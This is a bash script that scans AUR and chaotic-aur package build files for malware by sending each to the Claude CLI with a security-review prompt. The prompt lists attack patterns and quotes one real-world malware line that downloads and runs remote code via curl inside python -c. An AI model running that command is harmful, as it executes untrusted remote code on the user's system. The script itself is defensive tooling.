#!/bin/bash
# ~/bin/secure-update.sh
# Enhanced security scanner with parallelization and full scan support

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PARALLEL_JOBS=${PARALLEL_JOBS:-10}
CHECK_CHAOTIC_AUR=${CHECK_CHAOTIC_AUR:-true}
CHECK_AUR=${CHECK_AUR:-true}

# Parse command line arguments
FULL_SCAN=false
for arg in "$@"; do
    case $arg in
        --full-scan)
            FULL_SCAN=true
            shift
            ;;
        --parallel=*)
            PARALLEL_JOBS="${arg#*=}"
            shift
            ;;
        *)
            ;;
    esac
done

# Temporary directory for PKGBUILDs
TMPDIR=$(mktemp -d)
trap "rm -rf $TMPDIR" EXIT

# Security report file in script directory
TIMESTAMP=$(date +%Y%m%d-%H%M%S)
REPORT_FILE="$SCRIPT_DIR/aur-security-report-${TIMESTAMP}.log"
SCAN_RESULTS_DIR="$TMPDIR/scan_results"
mkdir -p "$SCAN_RESULTS_DIR"

echo -e "${BLUE}=== Package Security Scanner ===${NC}\n"
echo -e "${CYAN}Parallel jobs: $PARALLEL_JOBS${NC}"
echo -e "${CYAN}Full scan: $FULL_SCAN${NC}"
echo -e "${CYAN}Report location: $REPORT_FILE${NC}\n"

# First, update package databases
echo -e "${YELLOW}Updating package databases...${NC}"
sudo pacman -Sy

# Initialize arrays
declare -A ALL_PACKAGES

# Function to get all installed packages from a source
get_installed_packages() {
    local source=$1
    if [[ "$source" == "chaotic-aur" ]]; then
        pacman -Qm | while read pkg version; do
            if pacman -Si "$pkg" 2>/dev/null | grep -q "Repository.*chaotic-aur"; then
                echo "$pkg"
            fi
        done
    else
        # AUR packages (foreign packages not in chaotic-aur)
        pacman -Qm | while read pkg version; do
            if ! pacman -Si "$pkg" 2>/dev/null | grep -q "Repository.*chaotic-aur"; then
                echo "$pkg"
            fi
        done
    fi
}

# Determine which packages to scan
if [[ "$FULL_SCAN" == "true" ]]; then
    echo -e "${YELLOW}Full scan mode - getting all AUR and chaotic-aur packages...${NC}"

    if [[ "$CHECK_CHAOTIC_AUR" == "true" ]]; then
        while IFS= read -r pkg; do
            ALL_PACKAGES["$pkg"]="chaotic-aur"
        done < <(get_installed_packages "chaotic-aur")
    fi

    if [[ "$CHECK_AUR" == "true" ]]; then
        while IFS= read -r pkg; do
            ALL_PACKAGES["$pkg"]="aur"
        done < <(get_installed_packages "aur")
    fi
else
    # Get only packages with updates
    if [[ "$CHECK_CHAOTIC_AUR" == "true" ]]; then
        echo -e "${YELLOW}Checking for chaotic-aur updates...${NC}"
        while IFS= read -r pkg; do
            ALL_PACKAGES["$pkg"]="chaotic-aur"
        done < <(pacman -Qu | grep "chaotic-aur" | awk '{print $1}')
    fi

    if [[ "$CHECK_AUR" == "true" ]]; then
        echo -e "${YELLOW}Checking for AUR updates...${NC}"
        while IFS= read -r pkg; do
            ALL_PACKAGES["$pkg"]="aur"
        done < <(yay -Qua 2>/dev/null | awk '{print $1}')
    fi
fi

# Check if any packages found
if [ ${#ALL_PACKAGES[@]} -eq 0 ]; then
    echo -e "${GREEN}No packages to scan!${NC}"
    if [[ "$FULL_SCAN" != "true" ]]; then
        echo -e "\n${YELLOW}Checking official repository updates...${NC}"
        sudo pacman -Syu
    fi
    exit 0
fi

# Display packages to scan
echo -e "${BLUE}Found ${#ALL_PACKAGES[@]} package(s) to scan:${NC}"
if [ ${#ALL_PACKAGES[@]} -lt 20 ]; then
    for pkg in "${!ALL_PACKAGES[@]}"; do
        echo -e "  $pkg ${CYAN}(${ALL_PACKAGES[$pkg]})${NC}"
    done
else
    echo -e "  (Too many to list - see report for details)"
fi
echo

# Initialize report
cat > "$REPORT_FILE" << EOF
Package Security Scan Report
Generated: $(date)
Mode: $(if [[ "$FULL_SCAN" == "true" ]]; then echo "Full System Scan"; else echo "Update Scan"; fi)
Total Packages: ${#ALL_PACKAGES[@]}
Parallel Jobs: $PARALLEL_JOBS
======================================

EOF

# Function to scan a single package
scan_package() {
    local package="$1"
    local source_type="$2"
    local result_file="$3"
    local work_dir="$TMPDIR/work_$$_${RANDOM}"

    mkdir -p "$work_dir"
    cd "$work_dir"

    # Initialize result
    echo "PACKAGE: $package" > "$result_file"
    echo "SOURCE: $source_type" >> "$result_file"
    echo "START_TIME: $(date +%s)" >> "$result_file"

    # Try to get PKGBUILD
    local fetch_success=false

    if [[ "$source_type" == "chaotic-aur" ]]; then
        # Try various package name variants for chaotic-aur
        for variant in "$package" "${package%-git}" "${package%-bin}" "${package%-git}-git" "${package%-bin}-bin"; do
            if yay -G "$variant" &>/dev/null 2>&1; then
                fetch_success=true
                break
            fi
        done
    else
        if yay -G "$package" &>/dev/null 2>&1; then
            fetch_success=true
        fi
    fi

    if [[ "$fetch_success" != "true" ]]; then
        echo "STATUS: FAILED_DOWNLOAD" >> "$result_file"
        echo "END_TIME: $(date +%s)" >> "$result_file"
        rm -rf "$work_dir"
        return
    fi

    # Find the package directory
    local pkg_dir=$(find . -maxdepth 1 -type d ! -name "." | head -1)
    if [ -z "$pkg_dir" ]; then
        echo "STATUS: FAILED_NO_DIR" >> "$result_file"
        echo "END_TIME: $(date +%s)" >> "$result_file"
        rm -rf "$work_dir"
        return
    fi

    cd "$pkg_dir"

    # Create security prompt
    local security_prompt="You are a security expert reviewing a package for malware. Be extremely thorough and paranoid.

Package: $package
Source: $source_type

Review ALL files in this directory. Known attack vectors include:
- curl/wget downloading and executing remote scripts
- python -c commands with base64/hex encoded payloads
- Obfuscated code or suspicious encoding
- Creation of systemd services for persistence
- Modifications to PATH, .bashrc, or system configs
- Suspicious URLs (pastebin, URL shorteners, random domains)
- Scripts that download additional scripts
- Binary blobs or pre-compiled executables from untrusted sources

Recent real malware example:
python -c \"\$(curl https://segs.lol/TfPjm0)\"

IMPORTANT: Provide a DETAILED security analysis with:
1. Overall verdict: SAFE or THREAT DETECTED
2. Specific findings (if any threats found)
3. Affected files and line numbers
4. Risk level: LOW/MEDIUM/HIGH/CRITICAL
5. Detailed explanation of any suspicious code

Format your response as:
VERDICT: [SAFE/THREAT DETECTED]
RISK: [NONE/LOW/MEDIUM/HIGH/CRITICAL]
SUMMARY: [One line summary]
DETAILS:
[Detailed findings with file names and line numbers]
[Explain what the malicious code does]
[List all suspicious URLs or commands]"

    # Review with Claude
    local claude_response=$(claude --model sonnet --print "$security_prompt" . 2>&1)

    # Parse response
    local verdict=$(echo "$claude_response" | grep -i "^VERDICT:" | cut -d: -f2- | xargs)
    local risk=$(echo "$claude_response" | grep -i "^RISK:" | cut -d: -f2- | xargs)
    local summary=$(echo "$claude_response" | grep -i "^SUMMARY:" | cut -d: -f2- | xargs)

    # Write results
    echo "STATUS: SCANNED" >> "$result_file"
    echo "VERDICT: $verdict" >> "$result_file"
    echo "RISK: $risk" >> "$result_file"
    echo "SUMMARY: $summary" >> "$result_file"
    echo "CLAUDE_RESPONSE_START" >> "$result_file"
    echo "$claude_response" >> "$result_file"
    echo "CLAUDE_RESPONSE_END" >> "$result_file"
    echo "END_TIME: $(date +%s)" >> "$result_file"

    # Clean up
    rm -rf "$work_dir"
}

# Progress tracking
TOTAL_PACKAGES=${#ALL_PACKAGES[@]}
COMPLETED=0
SCAN_START_TIME=$(date +%s)

# Create a function to update progress
update_progress() {
    local completed=$1
    local total=$2
    local percent=$((completed * 100 / total))
    local elapsed=$(($(date +%s) - SCAN_START_TIME))
    local rate=$(if [ $elapsed -gt 0 ]; then echo "scale=2; $completed / $elapsed" | bc; else echo "0"; fi)

    echo -ne "\r${CYAN}Progress: $completed/$total ($percent%) - Rate: $rate pkg/sec${NC}    "
}

# Start parallel scanning
echo -e "${YELLOW}Starting parallel security scan...${NC}\n"

# Export functions for parallel execution
export -f scan_package
export TMPDIR SCAN_RESULTS_DIR

# Run scans in parallel using xargs
printf "%s\n" "${!ALL_PACKAGES[@]}" | \
    xargs -P "$PARALLEL_JOBS" -I {} bash -c '
        pkg="{}"
        source_type="'"${ALL_PACKAGES[{}]}"'"
        result_file="'"$SCAN_RESULTS_DIR"'/${pkg//\//_}.result"
        scan_package "$pkg" "$source_type" "$result_file"
    '

echo -e "\n\n${YELLOW}Processing results...${NC}"

# Process results
SAFE_PACKAGES=""
FAILED_PACKAGES=""
THREAT_PACKAGES=""
FAILED_DOWNLOADS=""

# Summary statistics
THREATS_CRITICAL=0
THREATS_HIGH=0
THREATS_MEDIUM=0
THREATS_LOW=0

for pkg in "${!ALL_PACKAGES[@]}"; do
    result_file="$SCAN_RESULTS_DIR/${pkg//\//_}.result"

    if [ ! -f "$result_file" ]; then
        FAILED_DOWNLOADS="$FAILED_DOWNLOADS $pkg"
        continue
    fi

    # Read result
    status=$(grep "^STATUS:" "$result_file" | cut -d: -f2- | xargs)

    if [[ "$status" == "FAILED_DOWNLOAD" ]] || [[ "$status" == "FAILED_NO_DIR" ]]; then
        FAILED_DOWNLOADS="$FAILED_DOWNLOADS $pkg"
        echo -e "\n--- $pkg ---" >> "$REPORT_FILE"
        echo "Failed to download PKGBUILD" >> "$REPORT_FILE"
        continue
    fi

    verdict=$(grep "^VERDICT:" "$result_file" | cut -d: -f2- | xargs)
    risk=$(grep "^RISK:" "$result_file" | cut -d: -f2- | xargs)
    summary=$(grep "^SUMMARY:" "$result_file" | cut -d: -f2- | xargs)

    # Append to report
    echo -e "\n--- $pkg (${ALL_PACKAGES[$pkg]}) ---" >> "$REPORT_FILE"
    echo "Verdict: $verdict" >> "$REPORT_FILE"
    echo "Risk: $risk" >> "$REPORT_FILE"
    echo "Summary: $summary" >> "$REPORT_FILE"

    # Extract Claude's full response
    sed -n '/^CLAUDE_RESPONSE_START$/,/^CLAUDE_RESPONSE_END$/p' "$result_file" | \
        sed '1d;$d' >> "$REPORT_FILE"

    # Categorize results
    if [[ "$verdict" == "SAFE" ]] || [[ "$risk" == "NONE" ]] || [[ -z "$risk" ]]; then
        SAFE_PACKAGES="$SAFE_PACKAGES $pkg"
    else
        THREAT_PACKAGES="$THREAT_PACKAGES $pkg"
        case "$risk" in
            "CRITICAL") ((THREATS_CRITICAL++)) ;;
            "HIGH") ((THREATS_HIGH++)) ;;
            "MEDIUM") ((THREATS_MEDIUM++)) ;;
            "LOW") ((THREATS_LOW++)) ;;
        esac
    fi
done

# Calculate scan duration
SCAN_END_TIME=$(date +%s)
SCAN_DURATION=$((SCAN_END_TIME - SCAN_START_TIME))
SCAN_MINUTES=$((SCAN_DURATION / 60))
SCAN_SECONDS=$((SCAN_DURATION % 60))

# Display summary
echo -e "\n${BLUE}═══ Security Scan Summary ═══${NC}\n"

echo -e "${CYAN}Scan Statistics:${NC}"
echo -e "  Total packages scanned: $TOTAL_PACKAGES"
echo -e "  Scan duration: ${SCAN_MINUTES}m ${SCAN_SECONDS}s"
echo -e "  Average time per package: $((SCAN_DURATION / TOTAL_PACKAGES))s"
echo -e "  Parallel jobs used: $PARALLEL_JOBS"

echo -e "\n${CYAN}Results:${NC}"
echo -e "  ${GREEN}Safe packages: $(echo $SAFE_PACKAGES | wc -w)${NC}"
echo -e "  ${RED}Threats detected: $(echo $THREAT_PACKAGES | wc -w)${NC}"
if [ $THREATS_CRITICAL -gt 0 ]; then
    echo -e "    ${RED}Critical: $THREATS_CRITICAL${NC}"
fi
if [ $THREATS_HIGH -gt 0 ]; then
    echo -e "    ${RED}High: $THREATS_HIGH${NC}"
fi
if [ $THREATS_MEDIUM -gt 0 ]; then
    echo -e "    ${YELLOW}Medium: $THREATS_MEDIUM${NC}"
fi
if [ $THREATS_LOW -gt 0 ]; then
    echo -e "    ${YELLOW}Low: $THREATS_LOW${NC}"
fi
echo -e "  ${YELLOW}Failed downloads: $(echo $FAILED_DOWNLOADS | wc -w)${NC}"

# List threats if any
if [ -n "$THREAT_PACKAGES" ]; then
    echo -e "\n${RED}═══ SECURITY THREATS DETECTED ═══${NC}"
    for pkg in $THREAT_PACKAGES; do
        result_file="$SCAN_RESULTS_DIR/${pkg//\//_}.result"
        risk=$(grep "^RISK:" "$result_file" | cut -d: -f2- | xargs)
        summary=$(grep "^SUMMARY:" "$result_file" | cut -d: -f2- | xargs)
        echo -e "\n${RED}Package: $pkg${NC}"
        echo -e "${RED}Risk: $risk${NC}"
        echo -e "${RED}Summary: $summary${NC}"
    done

    echo -e "\n${RED}SECURITY THREATS FOUND - Review report for details${NC}"
fi

# Append summary to report
cat >> "$REPORT_FILE" << EOF

======================================
SCAN SUMMARY
======================================
Scan completed: $(date)
Duration: ${SCAN_MINUTES}m ${SCAN_SECONDS}s
Total packages: $TOTAL_PACKAGES
Safe packages: $(echo $SAFE_PACKAGES | wc -w)
Threats found: $(echo $THREAT_PACKAGES | wc -w)
  Critical: $THREATS_CRITICAL
  High: $THREATS_HIGH
  Medium: $THREATS_MEDIUM
  Low: $THREATS_LOW
Failed downloads: $(echo $FAILED_DOWNLOADS | wc -w)

EOF

if [ -n "$THREAT_PACKAGES" ]; then
    echo "THREAT PACKAGES:" >> "$REPORT_FILE"
    for pkg in $THREAT_PACKAGES; do
        echo "  - $pkg" >> "$REPORT_FILE"
    done
fi

if [ -n "$FAILED_DOWNLOADS" ]; then
    echo -e "\nFAILED DOWNLOADS:" >> "$REPORT_FILE"
    for pkg in $FAILED_DOWNLOADS; do
        echo "  - $pkg" >> "$REPORT_FILE"
    done
fi

echo -e "\n${YELLOW}Full report saved to: $REPORT_FILE${NC}"

# Exit with appropriate code
if [ -n "$THREAT_PACKAGES" ]; then
    exit 1
else
    if [[ "$FULL_SCAN" != "true" ]] && [ -z "$THREAT_PACKAGES" ]; then
        echo -e "\n${GREEN}All packages passed security review!${NC}"
        echo -e "\n${YELLOW}Proceed with updates? [y/N]${NC}"
        read -r response

        if [[ "$response" =~ ^[Yy]$ ]]; then
            echo -e "\n${BLUE}Updating packages...${NC}"
            yay -Syu
        fi
    fi
    exit 0
fi
